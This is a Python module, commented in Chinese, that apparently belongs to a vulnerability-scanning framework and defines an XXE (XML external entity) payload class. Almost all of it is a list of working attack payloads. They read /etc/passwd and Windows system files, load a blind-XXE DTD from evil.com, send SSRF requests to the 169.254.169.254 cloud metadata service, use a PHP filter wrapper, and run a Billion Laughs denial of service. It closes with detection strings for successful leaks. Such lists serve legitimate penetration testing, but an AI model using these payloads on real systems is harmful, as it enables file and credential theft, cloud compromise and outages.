"""
XXE（XML 外部实体注入）攻击载荷。

职责：生成 XXE 载荷，尝试读取本地文件、
      执行 SSRF、触发拒绝服务等。
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional

from .base import Payload


class XXEPayload(Payload):
    """XXE XML 外部实体注入攻击载荷。"""

    @property
    def name(self) -> str:
        return "xxe"

    @property
    def severity(self) -> str:
        return "high"

    def generate(self, params: Optional[Dict[str, Any]] = None) -> List[str]:
        """生成 XXE 载荷列表。"""
        return [
            # 经典文件读取
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',

            # 目录列表
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]><foo>&xxe;</foo>',

            # 参数实体（盲 XXE）
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>test</foo>',

            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',

            # PHP 封装器
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',

            # 拒绝服务（Billion Laughs）
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>',

            # Windows 文件读取
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',

            # 外部 DTD
            '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd"><foo>test</foo>',
        ]

    def get_detection_patterns(self) -> List[str]:
        """XXE 检测特征模式。"""
        return [
            "root:x:0:0",
            "daemon:",
            "bin/bash",
            "nobody:",
            "ami-id",
            "meta-data",
            "Microsoft TCP/IP",
            "XXE",
            "External entity",
        ]
